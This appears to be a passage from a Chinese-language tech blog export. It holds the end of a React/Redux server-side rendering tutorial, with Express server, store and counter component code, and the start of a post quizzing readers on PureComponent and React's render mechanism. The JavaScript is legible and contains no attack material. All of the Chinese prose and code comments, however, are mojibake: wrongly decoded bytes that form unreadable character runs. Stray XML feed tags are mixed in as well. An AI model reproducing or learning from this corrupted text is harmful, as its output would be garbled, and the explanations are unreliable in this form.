// å¼•ç”¨ babel-polyfill é¿å…ç€è¦½å™¨ä¸æ”¯æ´éƒ¨åˆ† ES6 ç”¨æ³•import &#x27;babel-polyfill&#x27;;import React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;import &#123; Provider &#125; from &#x27;react-redux&#x27;;import CounterContainer from &#x27;../common/containers/CounterContainer&#x27;;import configureStore from &#x27;../common/store/configureStore&#x27;import &#123; fromJS &#125; from &#x27;immutable&#x27;;// å¾ server å–å¾—å‚³é€²ä¾†çš„ initialStateã€‚ç”±æ–¼å¾å­—ä¸²è½‰å›ç‰©ä»¶ï¼Œåˆç¨±ç‚º rehydrationï¼ˆè¦†æ°´ï¼‰ const initialState = window.__PRELOADED_STATE__;// ç”±æ–¼æˆ‘å€‘ä½¿ç”¨ ImmutableJSï¼Œæ‰€ä»¥éœ€è¦æŠŠåœ¨ server-side dehydrationï¼ˆè„«æ°´ï¼‰åˆåœ¨å‰ç«¯ rehydrationï¼ˆè¦†æ°´ï¼‰çš„ initialState è½‰æˆ ImmutableJS è³‡æ–™å‹æ…‹ï¼Œä¸¦å‚³é€² configureStore å»ºç«‹ storeconst store = configureStore(fromJS(initialState));// æ¥ä¸‹ä¾†å°±è·Ÿä¸€èˆ¬çš„ React App ä¸€æ¨£ï¼ŒæŠŠ store é€é Provider å¾€ä¸‹å‚³åˆ° Component ä¸­ReactDOM.render(  &lt;Provider store=&#123;store&#125;&gt;    &lt;CounterContainer /&gt;  &lt;/Provider&gt;,  document.getElementById(&#x27;app&#x27;));

ç”±æ–¼ Node ç«¯è¦åˆ°æ–°ç‰ˆå°æ–¼ ES6 æ”¯æ´è¼ƒå¥½ï¼Œæ‰€ä»¥å…ˆç”¨ babel-register åœ¨ src/server/index.js å»å³æ™‚è½‰è­¯ server.jsï¼Œä½†ç›®å‰ä¸å»ºè­°åœ¨ production ç’°å¢ƒä½¿ç”¨ã€‚
// use babel-register to precompile ES6 syntaxrequire(&#x27;babel-register&#x27;);require(&#x27;./server&#x27;);

æ¥è‘—æ˜¯æˆ‘å€‘ server ç«¯ï¼Œä¹Ÿæ˜¯é€™å€‹ç¯„ä¾‹æœ€é‡è¦çš„ä¸€å€‹éƒ¨åˆ†ã€‚é¦–å…ˆæˆ‘å€‘ç”¨ express å»ºç«‹äº†ä¸€å€‹ port ç‚º 3000 çš„ serverï¼Œä¸¦ä½¿ç”¨ webpack å»åŸ·è¡Œ client çš„ç¨‹å¼ç¢¼ã€‚é€™å€‹ç¯„ä¾‹ä¸­æˆ‘å€‘ä½¿ç”¨äº† handleRender ç•¶ request é€²ä¾†æ™‚ï¼ˆç›´æ¥æ‹œè¨ªé é¢æˆ–é‡æ–°æ•´ç†ï¼‰å°±æœƒåŸ·è¡Œ fetchCounter() é€²è¡Œè™•ç†ï¼š
import Express from &#x27;express&#x27;;import qs from &#x27;qs&#x27;;import webpack from &#x27;webpack&#x27;;import webpackDevMiddleware from &#x27;webpack-dev-middleware&#x27;;import webpackHotMiddleware from &#x27;webpack-hot-middleware&#x27;;import webpackConfig from &#x27;../webpack.config&#x27;;import React from &#x27;react&#x27;;import &#123; renderToString &#125; from &#x27;react-dom/server&#x27;;import &#123; Provider &#125; from &#x27;react-redux&#x27;;import &#123; fromJS &#125; from &#x27;immutable&#x27;;import configureStore from &#x27;../common/store/configureStore&#x27;;import CounterContainer from &#x27;../common/containers/CounterContainer&#x27;;import &#123; fetchCounter &#125; from &#x27;../common/api/counter&#x27;;const app = new Express();const port = 3000;function handleRender(req, res) &#123;  // æ¨¡ä»¿å¯¦éš›éåŒæ­¥ api è™•ç†æƒ…å½¢  fetchCounter(apiResult =&gt; &#123;  // è®€å– api æä¾›çš„è³‡æ–™ï¼ˆé€™é‚Šæˆ‘å€‘ api æ˜¯ç”¨ setTimeout é€²è¡Œæ¨¡ä»¿éåŒæ­¥ç‹€æ³ï¼‰ï¼Œè‹¥ç¶²å€åƒæ•¸æœ‰å€¼æ“‡å–å€¼ï¼Œè‹¥ç„¡å‰‡ä½¿ç”¨ api æä¾›çš„éš¨æ©Ÿå€¼ï¼Œè‹¥éƒ½æ²’æœ‰å‰‡å– 0    const params = qs.parse(req.query);    const counter = parseInt(params.counter, 10) || apiResult || 0;    // å°‡ initialState è½‰æˆ immutable å’Œç¬¦åˆ state è¨­è¨ˆçš„æ ¼å¼     const initialState = fromJS(&#123;      counterReducers: &#123;        count: counter,      &#125;    &#125;);    // å»ºç«‹ä¸€å€‹ redux store    const store = configureStore(initialState);    // ä½¿ç”¨ renderToString å°‡ component è½‰ç‚º string    const html = renderToString(      &lt;Provider store=&#123;store&#125;&gt;        &lt;CounterContainer /&gt;      &lt;/Provider&gt;    );    // å¾å»ºç«‹çš„ redux store ä¸­å–å¾— initialState    const finalState = store.getState();    // å°‡ HTML å’Œ initialState å‚³åˆ° client-side    res.send(renderFullPage(html, finalState));  &#125;)&#125;// HTML Markupï¼ŒåŒæ™‚ä¹ŸæŠŠ preloadedState è½‰æˆå­—ä¸²ï¼ˆstringifyï¼‰å‚³åˆ° client-sideï¼Œåˆç¨±ç‚º dehydrationï¼ˆè„«æ°´ï¼‰function renderFullPage(html, preloadedState) &#123;  return `    &lt;!doctype html&gt;    &lt;html&gt;      &lt;head&gt;        &lt;title&gt;Redux Universal Example&lt;/title&gt;      &lt;/head&gt;      &lt;body&gt;        &lt;div id=&quot;app&quot;&gt;$&#123;html&#125;&lt;/div&gt;        &lt;script&gt;          window.__PRELOADED_STATE__ = $&#123;JSON.stringify(preloadedState).replace(/&lt;/g, &#x27;\\x3c&#x27;)&#125;        &lt;/script&gt;        &lt;script src=&quot;/static/bundle.js&quot;&gt;&lt;/script&gt;      &lt;/body&gt;    &lt;/html&gt;    `&#125;// ä½¿ç”¨ middleware æ–¼ webpack å»é€²è¡Œ hot module reloading const compiler = webpack(webpackConfig);app.use(webpackDevMiddleware(compiler, &#123; noInfo: true, publicPath: webpackConfig.output.publicPath &#125;));app.use(webpackHotMiddleware(compiler));// æ¯æ¬¡ server æ¥åˆ° request éƒ½æœƒå‘¼å« handleRenderapp.use(handleRender);// ç›£è½ server ç‹€æ³app.listen(port, (error) =&gt; &#123;  if (error) &#123;    console.error(error)  &#125; else &#123;    console.info(`==&gt; ğŸŒ  Listening on port $&#123;port&#125;. Open up http://localhost:$&#123;port&#125;/ in your browser.`)  &#125;&#125;);

è™•ç†å®Œ Server çš„éƒ¨ä»½æ¥ä¸‹ä¾†æˆ‘å€‘ä¾†è™•ç† actions çš„éƒ¨ä»½ï¼Œåœ¨é€™å€‹ç¯„ä¾‹ä¸­ actions ç›¸å°ç°¡å–®ï¼Œä¸»è¦å°±æ˜¯æ–°å¢å’Œæ¸›å°‘å…©å€‹è¡Œç‚ºï¼Œä»¥ä¸‹ç‚º src/actions/counterActions.jsï¼š
import &#123; createAction &#125; from &#x27;redux-actions&#x27;;import &#123;  INCREMENT_COUNT,  DECREMENT_COUNT,&#125; from &#x27;../constants/actionTypes&#x27;;export const incrementCount = createAction(INCREMENT_COUNT);export const decrementCount = createAction(DECREMENT_COUNT);

ä»¥ä¸‹ç‚ºè¼¸å‡ºå¸¸æ•¸ src/constants/actionTypes.jsï¼š
export const INCREMENT_COUNT = &#x27;INCREMENT_COUNT&#x27;;  export const DECREMENT_COUNT = &#x27;DECREMENT_COUNT&#x27;;  

åœ¨é€™å€‹ç¯„ä¾‹ä¸­æˆ‘å€‘ä½¿ç”¨ setTimeout() ä¾†æ¨¡æ“¬éåŒæ­¥çš„ç”¢ç”Ÿè³‡æ–™è®“ server ç«¯åœ¨æ¯æ¬¡æ¥æ”¶ request æ™‚è®€å–éš¨æ©Ÿç”¢ç”Ÿçš„å€¼ã€‚å¯¦å‹™ä¸Šï¼Œæˆ‘å€‘æœƒé–‹ API è®“ Server è®€å–åˆå§‹è¦åŒ¯å…¥çš„ initialStateã€‚
function getRandomInt(min, max) &#123;  return Math.floor(Math.random() * (max - min)) + min&#125;export function fetchCounter(callback) &#123;  setTimeout(() =&gt; &#123;    callback(getRandomInt(1, 100))  &#125;, 500)&#125;

è«‡å®Œ actions æˆ‘å€‘ä¾†çœ‹æˆ‘å€‘çš„ reducersï¼Œåœ¨é€™å€‹ç¯„ä¾‹ä¸­ reducers ä¹Ÿæ˜¯ç›¸å°ç°¡å–®çš„ï¼Œä¸»è¦å°±æ˜¯é‡å°æ–°å¢å’Œæ¸›å°‘å…©å€‹è¡Œç‚ºå» set å€¼ï¼Œä»¥ä¸‹æ˜¯ src/reducers/counterReducers.jsï¼š
import &#123; fromJS &#125; from &#x27;immutable&#x27;;import &#123; handleActions &#125; from &#x27;redux-actions&#x27;;import &#123; CounterState &#125; from &#x27;../constants/models&#x27;;import &#123;  INCREMENT_COUNT,  DECREMENT_COUNT,&#125; from &#x27;../constants/actionTypes&#x27;;const counterReducers = handleActions(&#123;  INCREMENT_COUNT: (state) =&gt; (    state.set(      &#x27;count&#x27;,      state.get(&#x27;count&#x27;) + 1    )  ),  DECREMENT_COUNT: (state) =&gt; (    state.set(      &#x27;count&#x27;,      state.get(&#x27;count&#x27;) - 1    )  ),&#125;, CounterState);export default counterReducers;

æº–å‚™å¥½äº† rootReducer å°±å¯ä»¥ä½¿ç”¨ createStore ä¾†å‰µå»ºæˆ‘å€‘ storeï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ç”±æ–¼ configureStore éœ€è¦è¢« client-side å’Œ server-side ä½¿ç”¨ï¼Œæ‰€ä»¥æŠŠå®ƒè¼¸å‡ºæˆ function æ–¹ä¾¿å‚³å…¥ initialState ä½¿ç”¨ã€‚ä»¥ä¸‹æ˜¯ src/store/configureStore.jsï¼š
import &#123; createStore, applyMiddleware &#125; from &#x27;redux&#x27;;import thunk from &#x27;redux-thunk&#x27;;import createLogger from &#x27;redux-logger&#x27;;import rootReducer from &#x27;../reducers&#x27;;export default function configureStore(preloadedState) &#123;  const store = createStore(    rootReducer,    preloadedState,    applyMiddleware(createLogger(&#123; stateTransformer: state =&gt; state.toJS() &#125;), thunk)  )  return store&#125;

æœ€å¾Œä¾†åˆ°äº† components å’Œ containers çš„æ™‚é–“ï¼Œé€™æ¬¡æˆ‘å€‘çš„ Component ä¸»è¦æœ‰å…©å€‹æŒ‰éˆ•è®“ä½¿ç”¨è€…å¯ä»¥æ–°å¢å’Œæ¸›å°‘æ•¸å­—ä¸¦é¡¯ç¤ºç›®å‰æ•¸å­—ã€‚ä»¥ä¸‹æ˜¯ src/components/Counter/Counter.jsï¼š
import React, &#123; Component, PropTypes &#125; from &#x27;react&#x27;const Counter = (&#123;  count,  onIncrement,  onDecrement,&#125;) =&gt; (  &lt;p&gt;    Clicked: &#123;count&#125; times    &#123;&#x27; &#x27;&#125;    &lt;button onClick=&#123;onIncrement&#125;&gt;      +    &lt;/button&gt;    &#123;&#x27; &#x27;&#125;    &lt;button onClick=&#123;onDecrement&#125;&gt;      -    &lt;/button&gt;    &#123;&#x27; &#x27;&#125;  &lt;/p&gt;);// æ³¨æ„è¦æª¢æŸ¥ propTypes å’Œçµ¦å®šé è¨­å€¼Counter.propTypes = &#123;  count: PropTypes.number.isRequired,  onIncrement: PropTypes.func.isRequired,  onDecrement: PropTypes.func.isRequired&#125;Counter.defaultProps = &#123;  count: 0,  onIncrement: () =&gt; &#123;&#125;,  onDecrement: () =&gt; &#123;&#125;&#125;export default Counter;

æœ€å¾ŒæŠŠå–å‡ºçš„ count  å’Œäº‹ä»¶è™•ç†æ–¹æ³•ç”¨ connect å‚³åˆ° Counter å°±å¤§åŠŸå‘Šæˆäº†ï¼ä»¥ä¸‹æ˜¯ src/containers/CounterContainer/CounterContainer.jsï¼š
import &#x27;babel-polyfill&#x27;;import &#123; connect &#125; from &#x27;react-redux&#x27;;import Counter from &#x27;../../components/Counter&#x27;;import &#123;  incrementCount,  decrementCount,&#125; from &#x27;../../actions&#x27;;export default connect(  (state) =&gt; (&#123;    count: state.get(&#x27;counterReducers&#x27;).get(&#x27;count&#x27;),  &#125;),  (dispatch) =&gt; (&#123;     onIncrement: () =&gt; (      dispatch(incrementCount())    ),    onDecrement: () =&gt; (      dispatch(decrementCount())    ),  &#125;))(Counter);

è‹¥ä¸€åˆ‡é †åˆ©ï¼Œåœ¨çµ‚ç«¯æ©Ÿæ‰“ä¸Š $ npm startï¼Œä½ å°‡å¯ä»¥åœ¨ç€è¦½å™¨çš„ http://localhost:3000 çœ‹åˆ°è‡ªå·±çš„æˆæœï¼

ç¸½çµæœ¬ç« é—¡è¿°äº† Web é é¢ç€è¦½çš„é€²ç¨‹å’Œ Isomorphic JavaScript çš„å„ªå‹¢ï¼Œä¸¦ä»‹ç´¹äº†å¦‚ä½•ä½¿ç”¨ React Redux é€²è¡Œ Server Side Rendering çš„æ‡‰ç”¨ç¨‹å¼è¨­è¨ˆã€‚è‹¥æƒ³åƒè€ƒæ›´é€²ä¸€æ­¥è³‡æ–™å¯ä»¥åƒè€ƒç­†è€…æ’°å¯«çš„ React å…¥é–€æ•™å­¸æ›¸ ã€Šå¾é›¶é–‹å§‹å­¸ ReactJSã€‹ï¼Œç›¸é—œç¯„ä¾‹ç¨‹å¼ç¢¼å¯ä»¥åƒè€ƒé€™è£¡ï¼Œè‹¥æœ‰ä»»ä½•å•é¡Œæˆ–å»ºè­°æ­¡è¿ä¸€èµ·å­¸ç¿’è¨è«–ï¼šï¼‰
å»¶ä¼¸é–±è®€
DavidWells&#x2F;isomorphic-react-example
RickWong&#x2F;react-isomorphic-starterkit
Server-rendered React components in Rails
Our First Node.js App: Backbone on the Client and Server
Going Isomorphic with React
A service for server-side rendering your JavaScript views
Isomorphic JavaScript: The Future of Web Apps
React Router Server Rendering

ï¼ˆimage via airbnbï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ï¼Œç›®å‰å°ˆæ³¨åœ¨ Mobile å’Œ IoT æ‡‰ç”¨é–‹ç™¼ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>React, Redux, Server Rendering, Isomorphic, JavaScript, Node, Express, Universal JavaScript, Isomorphic JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>React æ€§èƒ½å„ªåŒ–å¤§æŒ‘æˆ°ï¼šä¸€æ¬¡ç†è§£ Immutable data è·Ÿ shouldComponentUpdate</title>
    <url>/2018/01/05/react-render-optimization/</url>
    <content><![CDATA[å‰é™£å­æ­£åœ¨é‡æ§‹å…¬å¸çš„å°ˆæ¡ˆï¼Œè©¦äº†ä¸€äº›æ±è¥¿ä¹‹å¾Œç™¼ç¾è‡ªå·±å°æ–¼ React çš„æ¸²æŸ“æ©Ÿåˆ¶å…¶å¯¦ä¸å¤ªäº†è§£ï¼Œä¸å¤ªçŸ¥é“ render ä»€éº¼æ™‚å€™æœƒè¢«è§¸ç™¼ã€‚è€Œå¾Œä¾†æˆ‘ç™¼ç¾ä¸åªæˆ‘é€™æ¨£ï¼Œå…¶å¯¦é‚„æœ‰æ»¿å¤šäººå°é€™æ•´å€‹æ©Ÿåˆ¶ä¸å¤ªç†Ÿæ‚‰ï¼Œå› æ­¤æ±ºå®šå¯«é€™ç¯‡ä¾†åˆ†äº«è‡ªå·±çš„å¿ƒå¾—ã€‚
å…¶å¯¦ä¸çŸ¥é“æ€éº¼å„ªåŒ–å€’é‚„å¥½ï¼Œæ›´æ…˜çš„äº‹æƒ…æ˜¯ä½ è‡ªä»¥ç‚ºåœ¨å„ªåŒ–ï¼Œå…¶å¯¦å»åœ¨æ‹–æ…¢æ•ˆèƒ½ï¼Œè€Œæ ¹æœ¬çš„åŸå› å°±æ˜¯å° React çš„æ•´å€‹æ©Ÿåˆ¶é‚„ä¸å¤ ç†Ÿã€‚è¢«ã€Œå„ªåŒ–ã€éçš„ component åè€Œé‚„è®Šæ…¢äº†ï¼é€™å€‹å°±åš´é‡äº†ã€‚
å› æ­¤ï¼Œé€™ç¯‡æ–‡ç« æœƒæ¶µè“‹åˆ°ä¸‹é¢å¹¾å€‹ä¸»é¡Œï¼š

Component è·Ÿ PureComponent çš„å·®ç•°
shouldComponentUpdate çš„ä½œç”¨
React çš„æ¸²æŸ“æ©Ÿåˆ¶
ç‚ºä»€éº¼è¦ç”¨ Immutable data structures

ç‚ºäº†åˆ¤åˆ¥ä½ åˆ°åº•å°ä»¥ä¸Šé€™äº›ç†è§£å¤šå°‘ï¼Œæˆ‘å€‘é¦¬ä¸Šé€²è¡Œå¹¾å€‹å°æ¸¬é©—ï¼æœ‰äº›æœ‰é™·é˜±ï¼Œè«‹çœå¤§çœ¼ç›çœ‹æ¸…æ¥šå•¦ï¼
React å°æ¸¬é©—ç¬¬ä¸€é¡Œä»¥ä¸‹ç¨‹å¼ç¢¼æ˜¯å€‹å¾ˆç°¡å–®çš„ç¶²é ï¼Œå°±ä¸€å€‹æŒ‰éˆ•è·Ÿä¸€å€‹å«åšContentçš„å…ƒä»¶è€Œå·²ï¼Œè€ŒæŒ‰éˆ•æŒ‰ä¸‹å»ä¹‹å¾Œæœƒæ”¹è®ŠAppé€™å€‹ component çš„ stateã€‚
class Content extends React.Component &#123;  render () &#123;    console.log(&#x27;render content!&#x27;);    return &lt;div&gt;Content&lt;/div&gt;  &#125;&#125;  class App extends React.Component &#123;  handleClick = () =&gt; &#123;    this.setState(&#123;      a: 1    &#125;)  &#125;  render() &#123;    console.log(&#x27;render App!&#x27;);    return (      &lt;div&gt;        &lt;button onClick=&#123;this.handleClick&#125;&gt;setState&lt;/button&gt;        &lt;Content /&gt;      &lt;/div&gt;    );  &#125;&#125;  ReactDOM.render(  &lt;App /&gt;,  document.getElementById(&#x27;container&#x27;));

è«‹å•ï¼šç•¶ä½ æŒ‰ä¸‹æŒ‰éˆ•ä¹‹å¾Œï¼Œconsole æœƒè¼¸å‡ºä»€éº¼ï¼Ÿ
A. ä»€éº¼éƒ½æ²’æœ‰ï¼ˆApp è·Ÿ Content çš„ render function éƒ½æ²’è¢«åŸ·è¡Œåˆ°ï¼‰B. åªæœ‰ render App!ï¼ˆåªæœ‰ App çš„ render function è¢«åŸ·è¡Œåˆ°ï¼‰C. render App! ä»¥åŠ render content!ï¼ˆå…©è€…çš„ render function éƒ½è¢«åŸ·è¡Œåˆ°ï¼‰
ç¬¬äºŒé¡Œä»¥ä¸‹ç¨‹å¼ç¢¼ä¹Ÿå¾ˆç°¡å–®ï¼Œåˆ†æˆä¸‰å€‹å…ƒä»¶ï¼šAppã€Table è·Ÿ Rowï¼Œç”± App å‚³é list çµ¦ Tableï¼ŒTable å†ç”¨ map æŠŠæ¯ä¸€å€‹ Row éƒ½æ¸²æŸ“å‡ºä¾†ã€‚
class Row extends Component &#123;  render () &#123;    const &#123;item, style&#125; = this.props;    return (      &lt;tr style=&#123;style&#125;&gt;        &lt;td&gt;&#123;item.id&#125;&lt;/td&gt;      &lt;/tr&gt;    )  &#125;&#125;  class Table extends Component &#123;  render() &#123;    const &#123;list&#125; = this.props;    const itemStyle = &#123;      color: &#x27;red&#x27;    &#125;    return (      &lt;table&gt;          &#123;list.map(item =&gt; &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; /&gt;)&#125;      &lt;/table&gt;    )  &#125;&#125;  class App extends Component &#123;  state = &#123;    list: Array(10000).fill(0).map((val, index) =&gt; (&#123;id: index&#125;))  &#125;    handleClick = () =&gt; &#123;    this.setState(&#123;      otherState: 1    &#125;)  &#125;    render() &#123;    const &#123;list&#125; = this.state;    return (      &lt;div&gt;        &lt;button onClick=&#123;this.handleClick&#125;&gt;change state!&lt;/button&gt;        &lt;Table list=&#123;list&#125; /&gt;      &lt;/div&gt;    );  &#125;&#125;

è€Œé€™æ®µç¨‹å¼ç¢¼çš„å•é¡Œå°±åœ¨æ–¼æŒ‰ä¸‹æŒ‰éˆ•ä¹‹å¾Œï¼ŒAppçš„ render function è¢«è§¸ç™¼ï¼Œç„¶å¾ŒTableçš„ render function ä¹Ÿè¢«è§¸ç™¼ï¼Œæ‰€ä»¥é‡æ–°æ¸²æŸ“äº†ä¸€æ¬¡æ•´å€‹åˆ—è¡¨ã€‚
å¯æ˜¯å‘¢ï¼Œæˆ‘å€‘é»æ“ŠæŒ‰éˆ•ä¹‹å¾Œï¼Œlistæ ¹æœ¬æ²’è®Šï¼Œå…¶å¯¦æ˜¯ä¸éœ€è¦é‡æ–°æ¸²æŸ“çš„ï¼Œæ‰€ä»¥è°æ˜çš„å°æ˜æŠŠ Table å¾ Component è®Šæˆ PureComponentï¼Œåªè¦ state è·Ÿ props æ²’è®Šå°±ä¸æœƒé‡æ–°æ¸²æŸ“ï¼Œè®Šæˆä¸‹é¢é€™æ¨£ï¼š
class Table extends PureComponent &#123;  render() &#123;    const &#123;list&#125; = this.props;    const itemStyle = &#123;      color: &#x27;red&#x27;    &#125;    return (      &lt;table&gt;          &#123;list.map(item =&gt; &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; /&gt;)&#125;      &lt;/table&gt;    )  &#125;&#125;  // ä¸çŸ¥é“ä»€éº¼æ˜¯ PureComponent çš„æœ‹å‹ï¼Œå¯ä»¥æƒ³æˆä»–è‡ªå·±å¹«ä½ åŠ äº†ä¸‹é¢çš„ functionshouldComponentUpdate (nextProps, nextState) &#123;  return !shallowEqual(this.props, nextProps) || !shallowEqual(this.state, nextState)&#125;

æŠŠ Table å¾ Component æ›æˆ PureComponent ä¹‹å¾Œï¼Œå¦‚æœæˆ‘å€‘å†åšä¸€æ¬¡åŒæ¨£çš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯æŒ‰ä¸‹change stateæŒ‰éˆ•æ”¹è®Š App çš„ stateï¼Œé€™æ™‚å€™æœƒæå‡æ•ˆç‡å—ï¼Ÿ
A. æœƒï¼Œåœ¨é€™æƒ…æ³ä¸‹ PureComponent æœƒæ¯” Component æœ‰æ•ˆç‡B. ä¸æœƒï¼Œå…©è€…å·®ä¸å¤šC. ä¸æœƒï¼Œåœ¨é€™æƒ…æ³ä¸‹ Component æœƒæ¯” PureComponent æœ‰æ•ˆç‡
ç¬¬ä¸‰é¡Œæ¥è‘—è®“æˆ‘ä¾†çœ‹ä¸€å€‹è·Ÿä¸Šä¸€é¡Œå¾ˆåƒçš„ä¾‹å­ï¼Œåªæ˜¯é€™æ¬¡æ›æˆæŒ‰æŒ‰éˆ•ä»¥å¾Œæœƒæ”¹è®Š listï¼š
class Row extends Component &#123;  render () &#123;    const &#123;item, style&#125; = this.props;    return (      &lt;tr style=&#123;style&#125;&gt;        &lt;td&gt;&#123;item.id&#125;&lt;/td&gt;      &lt;/tr&gt;    )  &#125;&#125;  class Table extends PureComponent &#123;  render() &#123;    const &#123;list&#125; = this.props;    const itemStyle = &#123;      color: &#x27;red&#x27;    &#125;    return (      &lt;table&gt;          &#123;list.map(item =&gt; &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; /&gt;)&#125;      &lt;/table&gt;    )  &#125;&#125;  class App extends Component &#123;  state = &#123;    list: Array(10000).fill(0).map((val, index) =&gt; (&#123;id: index&#125;))  &#125;    handleClick = () =&gt; &#123;    this.setState(&#123;      list: [...this.state.list, 1234567] // å¢åŠ ä¸€å€‹å…ƒç´     &#125;)  &#125;    render() &#123;    const &#123;list&#125; = this.state;    return (      &lt;div&gt;        &lt;button onClick=&#123;this.handleClick&#125;&gt;change state!&lt;/button&gt;        &lt;Table list=&#123;list&#125; /&gt;      &lt;/div&gt;    );  &#125;&#125;

é€™æ™‚å€™ Table çš„ PureComponent å„ªåŒ–å·²ç¶“æ²’æœ‰ç”¨äº†ï¼Œå› ç‚º list å·²ç¶“è®Šäº†ï¼Œæ‰€ä»¥æœƒè§¸ç™¼ render functionã€‚è¦ç¹¼çºŒå„ªåŒ–çš„è©±ï¼Œæ¯”è¼ƒå¸¸ç”¨çš„æ‰‹æ®µæ˜¯æŠŠ Row è®Šæˆ PureComponentï¼Œé€™æ¨£å°±å¯ä»¥ç¢ºä¿ç›¸åŒçš„ Row ä¸æœƒå†æ¬¡æ¸²æŸ“ã€‚
class Row extends PureComponent &#123;  render () &#123;    const &#123;item, style&#125; = this.props;    return (      &lt;tr style=&#123;style&#125;&gt;        &lt;td&gt;&#123;item.id&#125;&lt;/td&gt;      &lt;/tr&gt;    )  &#125;&#125;  class Table extends PureComponent &#123;  render() &#123;    const &#123;list&#125; = this.props;    const itemStyle = &#123;      color: &#x27;red&#x27;    &#125;    return (      &lt;table&gt;          &#123;list.map(item =&gt; &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; /&gt;)&#125;      &lt;/table&gt;    )  &#125;&#125;

è«‹å•ï¼šæŠŠ Row å¾ Component æ›æˆ PureComponent ä¹‹å¾Œï¼Œå¦‚æœæˆ‘å€‘å†åšä¸€æ¬¡åŒæ¨£çš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯æŒ‰ä¸‹change stateæŒ‰éˆ•æ”¹è®Š listï¼Œé€™æ™‚å€™æœƒæå‡æ•ˆç‡å—ï¼Ÿ
A. æœƒï¼Œåœ¨é€™æƒ…æ³ä¸‹ PureComponent æœƒæ¯” Component æœ‰æ•ˆç‡B. ä¸æœƒï¼Œå…©è€…å·®ä¸å¤šC. ä¸æœƒï¼Œåœ¨é€™æƒ…æ³ä¸‹ Component æœƒæ¯” PureComponent æœ‰æ•ˆç‡
React çš„ render æ©Ÿåˆ¶åœ¨å…¬å¸ƒç­”æ¡ˆä¹‹å‰ï¼Œå…ˆå¹«å¤§å®¶ç°¡å–®è¤‡ç¿’ä¸€ä¸‹ React æ˜¯å¦‚ä½•æŠŠä½ çš„ç•«é¢æ¸²æŸ“å‡ºä¾†çš„ã€‚
é¦–å…ˆï¼Œå¤§å®¶éƒ½çŸ¥é“ä½ åœ¨renderé€™å€‹ function è£¡é¢å¯ä»¥å›å‚³ä½ æƒ³æ¸²æŸ“çš„æ±è¥¿ï¼Œä¾‹å¦‚èªªï¼š
class Content extends React.Component &#123;  render () &#123;    return &lt;div&gt;Content&lt;/div&gt;  &#125;&#125;

è¦æ³¨æ„çš„æ˜¯é€™é‚Š return çš„æ±è¥¿ä¸æœƒç›´æ¥å°±æ”¾åˆ° DOM ä¸Šé¢å»ï¼Œè€Œæ˜¯æœƒå…ˆç¶“éä¸€å±¤ virtual DOMã€‚å…¶å¯¦ä½ å¯ä»¥ç°¡å–®æŠŠé€™å€‹ virtual DOM æƒ³æˆ JavaScript çš„ç‰©ä»¶ï¼Œä¾‹å¦‚èªªä¸Šé¢ Content render å‡ºä¾†çš„çµæœå¯èƒ½æ˜¯ï¼š
&#123;  tagName: &#x27;div&#x27;,  children: &#x27;Content&#x27;&#125;

æœ€å¾Œä¸€æ­¥å‰‡æ˜¯ React é€²è¡Œ virtual DOM diffï¼ŒæŠŠä¸Šæ¬¡çš„è·Ÿé€™æ¬¡çš„åšæ¯”è¼ƒï¼Œä¸¦ä¸”æŠŠè®Šå‹•çš„éƒ¨åˆ†æ›´æ–°åˆ°çœŸçš„ DOM ä¸Šé¢å»ã€‚
ç°¡å–®ä¾†èªªå‘¢ï¼Œå°±æ˜¯åœ¨ React Component ä»¥åŠ DOM ä¹‹é–“æ–°å¢äº†ä¸€å±¤ virtual DOMï¼Œå…ˆæŠŠä½ è¦æ¸²æŸ“çš„æ±è¥¿è½‰æˆ virtual DOMï¼Œå†æŠŠéœ€è¦æ›´æ–°çš„æ±è¥¿ update åˆ°çœŸçš„ DOM ä¸Šé¢å»ã€‚
å¦‚æ­¤ä¸€ä¾†ï¼Œå°±èƒ½å¤ æ¸›å°‘è§¸ç¢°åˆ°çœŸçš„ DOM çš„æ¬¡æ•¸ä¸¦ä¸”æå‡æ€§èƒ½ã€‚
èˆ‰å€‹ä¾‹å­ï¼Œå‡è¨­æˆ‘å€‘å¯¦ä½œä¸€å€‹éå¸¸ç°¡å–®çš„ï¼ŒæŒ‰ä¸€å€‹æŒ‰éˆ•ä¹‹å¾Œå°±æœƒæ”¹è®Š state çš„å°ç¯„ä¾‹ï¼š
class Content extends React.Component &#123;  render () &#123;    return &lt;div&gt;&#123;this.props.text&#125;&lt;/div&gt;  &#125;&#125;  class App extends React.Component &#123;  state = &#123;    text: &#x27;hello&#x27;  &#125;  handleClick = () =&gt; &#123;    this.setState(&#123;      text: &#x27;world&#x27;    &#125;)  &#125;  render() &#123;    return (      &lt;div&gt;        &lt;button onClick=&#123;this.handleClick&#125;&gt;setState&lt;/button&gt;        &lt;Content text=&#123;this.state.text&#125; /&gt;      &lt;/div&gt;    );  &#125;&#125;

åœ¨ç¨‹å¼å‰›é–‹å§‹åŸ·è¡Œæ™‚ï¼Œæ¸²æŸ“çš„é †åºæ˜¯é€™æ¨£çš„ï¼š

å‘¼å« App çš„ render
å‘¼å« Content çš„ render
æ‹¿åˆ° virtual DOM
è·Ÿä¸Šæ¬¡çš„ virtual DOM åšæ¯”è¼ƒ
æŠŠæ”¹è®Šçš„åœ°æ–¹æ‡‰ç”¨åˆ°çœŸçš„ DOM

é€™æ™‚å€™çš„ virtual DOM æ•´é«”æ‡‰è©²æœƒé•·å¾—åƒé€™æ¨£ï¼š
&#123;  tagName: &#x27;div&#x27;,  children: [    &#123;      tagName: &#x27;button&#x27;,      children: &#x27;setState&#x27;    &#125;, &#123;      tagName: &#x27;div&#x27;,      children: &#x27;hello&#x27;    &#125;  ]&#125;

